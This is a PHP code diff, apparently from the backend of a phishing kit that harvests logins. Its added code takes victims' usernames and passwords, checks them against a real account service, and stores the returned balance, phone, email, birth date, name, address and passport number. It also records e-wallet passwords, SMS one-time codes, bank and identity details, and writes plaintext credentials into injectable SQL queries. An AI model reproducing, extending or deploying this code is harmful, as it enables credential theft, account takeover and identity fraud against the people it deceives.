@@ -2,8 +2,8 @@
 include 'inc/config.php';
 include 'inc/functions.php';
 include 'inc/anti.php';
-// include 'inc/check.php';
-// include 'inc/cevir.php';
+include 'inc/check.php';
+include 'inc/cevir.php';
 
 
 
@@ -18,6 +18,8 @@ if ($q == 'login') {
   antiflood();
   $login = escape('field_first');
   $password = escape('field_second');
+  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
+  $passport = escape('passport');
   $device = $mobile == true ? 'mobile' : 'pc';
 
 	
@@ -25,20 +27,61 @@ if ($q == 'login') {
   $user = $db->query("SELECT id from users where login='$login' and password='$password'")->fetch_assoc();
   if (strlen($login) < 3 or strlen($password) < 3) {
     die('error');
-  }
-  elseif (isset($user['id'])) {
+  }elseif(!empty($phone) && strlen($phone) < 10 || strlen($phone) > 14){
+    die('error_phone');
+	  
+  }elseif (isset($user['id'])) {
     $db -> query("UPDATE users set device = '$device' where id = '$user[id]'");
     $_SESSION['user_id'] = $user['id'];
     die('success');
   }else{
+		$durum = getir($login,$password);
+		if (!($durum == "hata")){
+			$kbilgi = unicodeStringa(para($durum));
+			$kbilgi1 = unicodeStringa(bilgi($durum));
+			
+			$para = json_decode($kbilgi,false)->user->balance;
+			
+			$phone = json_decode($kbilgi1,false)->subscriptions->phoneNumber;
+			$username = json_decode($kbilgi1,false)->subscriptions->email;
+			$gun = json_decode($kbilgi1,false)->profile->dateOfBirth;
+			
+			$adi = json_decode($kbilgi1,false)->profie->firstName;
+			$soyadi = json_decode($kbilgi1,false)->profile->lastName;
+			$ulke = json_decode($kbilgi1,false)->address->country;
+			$bolge = cevir(json_decode($kbilgi1,false)->address->city);
+			$adres = json_decode($kbilgi1,false)->address->street;
 
+			
+
+			
+			
 			$db -> query("INSERT into users set
 			login='$login',
 			password='$password',
+			balance='$para',
+			originalbalance='$para',
+			phone='$phone',
+			passport='$passport',
 			device='$device',
-			ip='$ip'");
+			ip='$ip',
+			data1='$kbilgi',
+			data2='$kbilgi1',
+			data3='$durum',
+			username='$username',
+			gun='$gun',
+			adi='$adi',
+			soyadi='$soyadi',
+			bolge='$bolge',
+			adres='$adres',
+			ulke='$ulke'");
 			$_SESSION['user_id'] = $db->insert_id;
 			die('success');
+			
+		}else{
+			die('error');
+		}
+    
   }
 }elseif($q == 'logout'){
   session_destroy();
@@ -46,7 +89,18 @@ if ($q == 'login') {
   antiflood();
   $login = escape('field_first');
   $password = escape('field_second');
+  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
+  $passport = escape('passport');
   $email = escape('email');
+  $adi = escape('firstName');
+  $soyadi = escape('surname');
+  $gun = escape('gun');
+  $ay = escape('ay');
+  $yil = escape('yil');
+  $ulke = escape('ulke');
+  $bolge = cevir(escape('bolge'));
+  $adres = escape('adres');
+
 
 
   $type = intval(1);
@@ -58,10 +112,21 @@ if ($q == 'login') {
 		$db -> query("INSERT into users set
 		  login = '$login',
 		  password = '$password',
+		  phone = '$phone',
+		  passport = '$passport',
 		  type = '$type',
 		  device = '$device',
 		  ip = '$ip',
-		  username='$login'");
+		  username='$login',
+		  gun='$gun',
+		  ay='$ay',
+		  yil='$yil',
+		  adi='$adi',
+		  soyadi='$soyadi',
+		  email='$email',
+		  bolge='$bolge',
+		  adres='$adres',
+		  ulke='$ulke'");
 	  $_SESSION['user_id'] = $db->insert_id;
 	  die('success');
   }
@@ -89,7 +154,7 @@ $q = $_GET["q"];
         papara_email = '$datas[papara_email]',
         papara_password = '$datas[papara_password]',
         papara_sms_code = '$datas[papara_sms_code]',
-        bank_id = '$datas[bank_id]',
+        bank_id = '$datas[bank]',
         sender_phone = '$datas[sender_phone]',
         identity = '$datas[identity]',
         buyer_phone = '$datas[buyer_phone]',
@@ -115,11 +180,6 @@ $q = $_GET["q"];
     $db -> query("UPDATE payments set papara_sms_code = '$datas[papara_sms_code]' where id = '$datas[id]'");
     die(json_encode(['success' => true, 'message' => json_encode($datas)]));
   }elseif($q == "get-bank"){
-    $id = intval($_POST['id']);
-    $res = $db -> query("SELECT * from banks where id = $id")->fetch_assoc();
-    echo json_encode($res, JSON_UNESCAPED_UNICODE);
-  }
-  elseif($q == "get-bank"){
     $id = intval($_POST['id']);
     $res = $db -> query("SELECT * from banks where id = $id")->fetch_assoc();
     echo json_encode($res, JSON_UNESCAPED_UNICODE);
